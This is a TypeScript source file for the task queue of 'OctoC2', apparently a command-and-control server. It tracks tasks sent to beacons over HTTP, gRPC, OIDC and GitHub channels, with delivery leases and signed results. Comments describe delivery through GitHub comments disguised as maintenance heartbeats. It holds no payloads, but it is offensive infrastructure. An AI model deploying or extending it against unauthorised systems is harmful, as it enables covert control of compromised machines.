/**
 * OctoC2 Server — TaskQueue
 *
 * Per-beacon in-memory task queue. Supports lifecycle states:
 *   pending   → task created, not yet delivered to beacon
 *   delivered → deploy comment posted, awaiting beacon acknowledgement
 *   completed → beacon posted a result comment (success or failure)
 *   failed    → delivery timed out or explicit operator cancel
 *
 * Thread safety: single-threaded Bun runtime — no locks needed.
 */

import {
  sha256Hex,
  type CompleteTaskResultInput,
  type CompleteTaskResultResult,
  type DeliveryOutcome,
  type OidcRequestGuard,
  type OctoStore,
  type StoredTask,
} from "./store/index.ts";
import {
  TASK_KINDS,
  assertTaskArgs,
  type TaskKind,
} from "@octoc2/shared";

export type TaskState = "pending" | "delivered" | "completed" | "failed";
export type { TaskKind };

const SUPPORTED_TASK_KINDS: ReadonlySet<string> = new Set(TASK_KINDS);

export type CompletionOutcome =
  | "completed"
  | "duplicate"
  | "conflict"
  | "not_found"
  | "wrong_owner"
  | "terminal"
  | "verification_required";

export interface VerifiedTaskCompletionInput
  extends Omit<CompleteTaskResultInput, "signatureVerified"> {
  canonicalDigest: string;
}

export interface QueuedTask {
  taskId:      string;
  beaconId:    string;
  kind:        TaskKind;
  args:        Record<string, unknown>;
  state:       TaskState;
  createdAt:   string;  // ISO-8601
  deliveredAt: string | null;
  completedAt: string | null;
  /** Ref token embedded in the deploy comment heartbeat line (e.g. "maint-a3f9") */
  ref:         string;
  /** Raw result payload from beacon, if completed */
  result:      string | null;
  /**
   * If set, only the named tentacle channel should deliver this task.
   * Channels skip tasks where this field is set to a different kind.
   */
  preferredChannel?: string | undefined;
}

export interface ClaimedTaskDelivery {
  task: QueuedTask;
  leaseToken: string;
}

export class DeliveryClaimOwnershipLostError extends Error {
  constructor() {
    super("OIDC request ownership was lost while claiming task deliveries");
    this.name = "DeliveryClaimOwnershipLostError";
  }
}

interface InMemoryDeliveryLease {
  leaseToken: string;
  channel: string;
  expiresAtMs: number;
}

export class TaskQueue {
  /** beaconId → ordered list of tasks */
  private readonly queues = new Map<string, QueuedTask[]>();
  /** taskId → QueuedTask (O(1) lookup) */
  private readonly taskIndex = new Map<string, QueuedTask>();
  /** ref → QueuedTask (O(1) lookup) */
  private readonly refIndex = new Map<string, QueuedTask>();
  private readonly inMemoryDeliveryLeases =
    new Map<string, InMemoryDeliveryLease>();
  private readonly store: OctoStore | null;

  constructor(store?: OctoStore) {
    this.store = store ?? null;
    if (this.store) this.loadFromStore();
  }

  /**
   * Add a new task for a beacon. Generates a short ref token used in the
   * deploy comment heartbeat line so the beacon can correlate results.
   */
  queueTask(
    beaconId: string,
    kind: TaskKind,
    args: Record<string, unknown> = {},
    preferredChannel?: string,
  ): QueuedTask {
    const validatedArgs = assertTaskArgs(kind, args) as Record<string, unknown>;
    const taskId = crypto.randomUUID();
    const ref    = taskId.slice(0, 8);  // first 8 hex chars as short ref

    let task: QueuedTask = {
      taskId,
      beaconId,
      kind,
      args: validatedArgs,
      state:       "pending",
      createdAt:   new Date().toISOString(),
      deliveredAt: null,
      completedAt: null,
      ref,
      result:      null,
      ...(preferredChannel !== undefined && { preferredChannel }),
    };

    if (this.store) {
      task = this.fromStoredTask(
        this.store.createTask({
          taskId,
          beaconId,
          kind,
          args: validatedArgs,
          ref,
          preferredChannel: preferredChannel ?? null,
          createdAt: task.createdAt,
        }),
      );
    }

    this.indexTask(task);

    console.log(`[TaskQueue] Queued task ${taskId} (${kind}) for beacon ${beaconId}`);
    return task;
  }

  /** Return all pending tasks for a beacon (ready to be delivered). */
  getPendingTasks(beaconId: string): QueuedTask[] {
    return (this.queues.get(beaconId) ?? []).filter(t => t.state === "pending");
  }

  /**
   * Return tasks this channel may claim now.
   *
   * Store-backed queues include both pending tasks and previously delivered
   * tasks whose durable delivery lease has expired. That is the retry path
   * used after a task was posted but no signed result arrived.
   */
  getDeliverableTasks(
    beaconId: string,
    channel: string,
    at?: string,
  ): QueuedTask[] {
    if (!this.store) {
      const atMs = at === undefined ? Date.now() : new Date(at).getTime();
      return (this.queues.get(beaconId) ?? []).filter((task) => {
        if (task.state !== "pending" && task.state !== "delivered") {
          return false;
        }
        if (task.preferredChannel && task.preferredChannel !== channel) {
          return false;
        }
        const lease = this.inMemoryDeliveryLeases.get(task.taskId);
        if (!lease) return true;
        if (lease.expiresAtMs > atMs) return false;
        this.inMemoryDeliveryLeases.delete(task.taskId);
        return true;
      });
    }
    const stored = this.store.listDeliverableTasks(
      beaconId,
      channel,
      at,
    );
    return stored.map((task) => {
      this.syncTaskFromStore(task.taskId);
      const hydrated = this.getTask(task.taskId);
      if (!hydrated) {
        throw new Error(`Failed to hydrate deliverable task ${task.taskId}`);
      }
      return hydrated;
    });
  }

  /**
   * Atomically claim every task currently deliverable through one transport.
   *
   * Durable queues use SQLite leases, so simultaneous HTTP, gRPC, OIDC, and
   * GitHub polls cannot hand the same task to more than one channel. The
   * in-memory fallback mirrors that behavior for isolated unit tests.
   */
  claimDeliveries(
    beaconId: string,
    channel: string,
    leaseDurationMs: number,
    workerId = `server:${channel}`,
    oidcRequestGuard?: OidcRequestGuard,
  ): ClaimedTaskDelivery[] {
    if (
      !Number.isSafeInteger(leaseDurationMs) ||
      leaseDurationMs <= 0
    ) {
      throw new Error("leaseDurationMs must be a positive safe integer");
    }

    const claimed: ClaimedTaskDelivery[] = [];
    const nowMs = Date.now();
    for (const task of this.getDeliverableTasks(beaconId, channel)) {
      if (this.store) {
        const outcome = this.store.claimDelivery({
          taskId: task.taskId,
          beaconId,
          channel,
          workerId,
          leaseDurationMs,
          ...(oidcRequestGuard && { oidcRequestGuard }),
        });
        if (outcome.status === "oidc_request_ownership_lost") {
          throw new DeliveryClaimOwnershipLostError();
        }
        if (outcome.status === "claimed") {
          claimed.push({
            task,
            leaseToken: outcome.lease.leaseToken,
          });
        }
        continue;
      }

      const existing = this.inMemoryDeliveryLeases.get(task.taskId);
      if (existing && existing.expiresAtMs > nowMs) continue;
      const leaseToken = crypto.randomUUID();
      this.inMemoryDeliveryLeases.set(task.taskId, {
        leaseToken,
        channel,
        expiresAtMs: nowMs + leaseDurationMs,
      });
      claimed.push({ task, leaseToken });
    }
    return claimed;
  }

  /**
   * Finish claims only after the transport response or remote artifact has
   * been constructed successfully. Transient failures release the claim for
   * retry; delivered claims remain active until expiry or signed completion.
   */
  finishDeliveries(
    deliveries: readonly ClaimedTaskDelivery[],
    outcome: DeliveryOutcome,
    error?: unknown,
  ): void {
    const message = error instanceof Error
      ? error.message
      : error === undefined
        ? null
        : String(error);

    for (const delivery of deliveries) {
      if (this.store) {
        const finished = this.store.finishDelivery({
          leaseToken: delivery.leaseToken,
          outcome,
          ...(message !== null && { error: message }),
        });
        if (finished) this.syncTaskFromStore(delivery.task.taskId);
        continue;
      }

      const lease = this.inMemoryDeliveryLeases.get(delivery.task.taskId);
      if (!lease || lease.leaseToken !== delivery.leaseToken) continue;
      if (outcome === "delivered") {
        this.markDelivered(delivery.task.taskId);
      } else {
        this.inMemoryDeliveryLeases.delete(delivery.task.taskId);
        if (outcome === "permanent_failure") {
          this.markFailed(delivery.task.taskId);
        }
      }
    }
  }

  /** Return all tasks for a beacon regardless of state. */
  getAllTasks(beaconId: string): QueuedTask[] {
    return [...(this.queues.get(beaconId) ?? [])];
  }

  getTask(taskId: string): QueuedTask | undefined {
    return this.taskIndex.get(taskId);
  }

  /** Refresh one cached task after an atomic store-side transition. */
  refreshFromStore(taskId: string): QueuedTask | undefined {
    if (!this.store) return this.getTask(taskId);
    this.syncTaskFromStore(taskId);
    return this.getTask(taskId);
  }

  /** Refresh one in-memory queue entry after a store-level transaction. */
  refreshTask(taskId: string): void {
    this.syncTaskFromStore(taskId);
  }

  /** Find a task by its short ref token. */
  getTaskByRef(ref: string): QueuedTask | undefined {
    return this.refIndex.get(ref);
  }

  /**
   * Mark a task as delivered (deploy comment posted).
   * Returns false if task not found or not in pending state.
   */
  markDelivered(taskId: string): boolean {
    const task = this.getTask(taskId);
    if (!task || task.state !== "pending") return false;

    if (this.store) {
      if (!this.store.markTaskDelivered(taskId)) return false;
      this.syncTaskFromStore(taskId);
    } else {
      task.state       = "delivered";
      task.deliveredAt = new Date().toISOString();
    }
    return true;
  }

  /**
   * Complete a task only when the submitting beacon owns it.
   *
   * Exact duplicate results are idempotent. A different result for an already
   * completed task is a conflict and must never overwrite the accepted result.
   *
   * @deprecated Store-backed callers must use completeVerifiedTask(). Raw
   * result completion remains only for unmigrated in-memory callers.
   */
  completeTask(
    beaconId: string,
    taskId: string,
    result: string | null = null,
  ): CompletionOutcome {
    const task = this.getTask(taskId);
    if (!task) return "not_found";
    if (task.beaconId !== beaconId) return "wrong_owner";
    if (task.state === "failed") return "terminal";
    if (this.store) return "verification_required";
    if (task.state === "completed") {
      return task.result === result ? "duplicate" : "conflict";
    }

    task.state       = "completed";
    task.completedAt = new Date().toISOString();
    task.result      = result;
    this.inMemoryDeliveryLeases.delete(taskId);

    console.log(`[TaskQueue] Task ${taskId} completed for beacon ${task.beaconId}`);
    return "completed";
  }

  /**
   * Persist a result only after the central identity service has verified its
   * signature. The caller-provided digest is checked before the store's
   * ownership, key-binding, deduplication, and state-transition transaction.
   */
  completeVerifiedTask(
    input: VerifiedTaskCompletionInput,
  ): CompleteTaskResultResult {
    if (!this.store) {
      throw new Error(
        "completeVerifiedTask requires an OctoStore-backed TaskQueue",
      );
    }
    const { canonicalDigest, ...storeInput } = input;
    if (sha256Hex(storeInput.canonicalResult) !== canonicalDigest) {
      throw new Error("canonicalDigest does not match canonicalResult");
    }

    const outcome = this.store.completeTaskResult({
      ...storeInput,
      signatureVerified: true,
    });
    if (
      outcome.status === "completed" ||
      outcome.status === "exact_duplicate" ||
      outcome.status === "conflicting_duplicate"
    ) {
      this.syncTaskFromStore(input.taskId);
    }
    return outcome;
  }

  /** Mark a task as failed (timeout, operator cancel, delivery error). */
  markFailed(taskId: string): boolean {
    const task = this.getTask(taskId);
    if (!task || task.state === "completed" || task.state === "failed") return false;

    if (this.store) {
      if (!this.store.markTaskFailed(taskId, "task failed")) return false;
      this.syncTaskFromStore(taskId);
    } else {
      task.state       = "failed";
      task.completedAt = new Date().toISOString();
      this.inMemoryDeliveryLeases.delete(taskId);
    }

    console.log(`[TaskQueue] Task ${taskId} failed for beacon ${task.beaconId}`);
    return true;
  }

  /**
   * Expire delivered tasks that have not been completed within `timeoutMs`.
   * Called on each poll cycle.
   */
  sweepExpired(timeoutMs = 30 * 60 * 1000): void {
    const cutoff = Date.now() - timeoutMs;
    for (const queue of this.queues.values()) {
      for (const task of queue) {
        if (
          task.state === "delivered" &&
          task.deliveredAt !== null &&
          new Date(task.deliveredAt).getTime() < cutoff
        ) {
          if (this.store) {
            if (!this.store.markTaskFailed(task.taskId, "delivery timeout")) {
              continue;
            }
            this.syncTaskFromStore(task.taskId);
          } else {
            task.state       = "failed";
            task.completedAt = new Date().toISOString();
          }
          console.log(`[TaskQueue] Task ${task.taskId} expired (delivery timeout)`);
        }
      }
    }
  }

  private loadFromStore(): void {
    if (!this.store) return;
    for (const beacon of this.store.listBeacons()) {
      for (const stored of this.store.listTasksForBeacon(beacon.beaconId)) {
        this.indexTask(this.fromStoredTask(stored));
      }
    }
  }

  private syncTaskFromStore(taskId: string): void {
    if (!this.store) return;
    const stored = this.store.getTask(taskId);
    if (!stored) return;
    const hydrated = this.fromStoredTask(stored);
    const existing = this.taskIndex.get(taskId);
    if (existing) {
      Object.assign(existing, hydrated);
      if (hydrated.preferredChannel === undefined) {
        delete existing.preferredChannel;
      }
      return;
    }
    this.indexTask(hydrated);
  }

  private fromStoredTask(stored: StoredTask): QueuedTask {
    if (!SUPPORTED_TASK_KINDS.has(stored.kind)) {
      throw new Error(`Unsupported persisted task kind: ${stored.kind}`);
    }
    const result = this.store?.getTaskResult(stored.taskId);
    const state: TaskState =
      stored.state === "pending" ||
      stored.state === "delivered" ||
      stored.state === "completed"
        ? stored.state
        : "failed";
    return {
      taskId: stored.taskId,
      beaconId: stored.beaconId,
      kind: stored.kind as TaskKind,
      args: { ...stored.args },
      state,
      createdAt: stored.createdAt,
      deliveredAt: stored.deliveredAt,
      completedAt: stored.completedAt,
      ref: stored.ref,
      result: result?.canonicalResult ?? null,
      ...(stored.preferredChannel !== null
        ? { preferredChannel: stored.preferredChannel }
        : {}),
    };
  }

  private indexTask(task: QueuedTask): void {
    const queue = this.queues.get(task.beaconId) ?? [];
    queue.push(task);
    this.queues.set(task.beaconId, queue);
    this.taskIndex.set(task.taskId, task);
    this.refIndex.set(task.ref, task);
  }
}
